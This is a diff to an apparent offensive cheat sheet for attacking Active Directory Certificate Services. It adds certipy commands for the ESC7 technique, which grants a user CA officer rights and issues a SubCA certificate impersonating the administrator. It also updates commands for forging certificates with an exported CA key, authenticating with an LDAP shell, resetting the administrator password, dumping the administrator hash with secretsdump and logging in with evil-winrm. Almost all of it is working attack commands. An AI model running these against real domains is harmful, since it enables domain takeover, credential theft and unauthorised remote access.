@@ -471,18 +471,27 @@ WriteDacl
 WriteOwner
 
 [*] Active Directory: CS
++---------- Certificate Authority ----------+
+export CA=
+
++---------- ESC7 ----------+
+certipy ca -dc-ip $TARGET -u '$USERNAME' -p '$PASSWORD' -ca "$CA" -add-officer '$USERNAME' -target $DC
+certipy req -dc-ip $TARGET -u '$USERNAME' -p '$PASSWORD' -ca "$CA" -template 'SubCA' -upn 'administrator' -target $DC -key-size '4096' <<< 'y' | grep -v '[-]' | tee /dev/tty | awk '/Request ID is/ {printf "[*] Now use \x27%s.key\x27 in the following requests as -issue-request \x27%s\x27 and -retrieve \x27%s\x27\n", $5, $5, $5}'
+certipy ca -dc-ip $TARGET -u '$USERNAME' -p '$PASSWORD' -ca "$CA" -issue-request ''
+certipy req -dc-ip $TARGET -u '$USERNAME' -p '$PASSWORD' -ca "$CA" -retrieve ''
+
 +---------- Request ----------+
-certipy-ad req -dc-ip $TARGET -u '$USERNAME' -p '$PASSWORD' -ca '' -template '' -upn 'Administrator' -target $DC -key-size '4096'
-certipy-ad req -dc-ip $TARGET -u '$USERNAME' -p '$PASSWORD' -ca '' -template '' -dynamic-endpoint
+certipy req -dc-ip $TARGET -u '$USERNAME' -p '$PASSWORD' -ca "$CA" -template '' -upn 'Administrator' -target $DC -key-size '4096'
+certipy req -dc-ip $TARGET -u '$USERNAME' -p '$PASSWORD' -ca "$CA" -template '' -dynamic-endpoint
 
 +---------- Forge ----------+
 certutil -store my
 certutil -exportpfx my "75b2f4bbf31f108945147b466131bdca" ca_exported.pfx
-certipy-ad forge -ca-pfx 'ca_exported.pfx' -upn ADMINISTRATOR@$DOM -subject 'CN=ADMINISTRATOR,CN=USERS,DC=$DOM,DC=LOCAL'
+certipy forge -ca-pfx 'ca_exported.pfx' -upn ADMINISTRATOR@$DOM -subject 'CN=ADMINISTRATOR,CN=USERS,DC=$DOM,DC=LOCAL'
 
 +---------- Authenticate ----------+
-certipy-ad auth -dc-ip $TARGET -domain $DC -ldap-shell -pfx 'administrator.pfx'
-certipy-ad auth -dc-ip $TARGET -domain $DC -ldap-shell -pfx 'administrator_forged.pfx'
+certipy auth -dc-ip $TARGET -domain $DC -ldap-shell -pfx 'administrator.pfx'
+certipy auth -dc-ip $TARGET -domain $DC -ldap-shell -pfx 'administrator_forged.pfx'
 change_password administrator 123qweasdF!
 impacket-secretsdump -dc-ip $TARGET -target-ip $TARGET $DC -k -no-pass -just-dc-user administrator
 evil-winrm -i $TARGET -u administrator -H ''
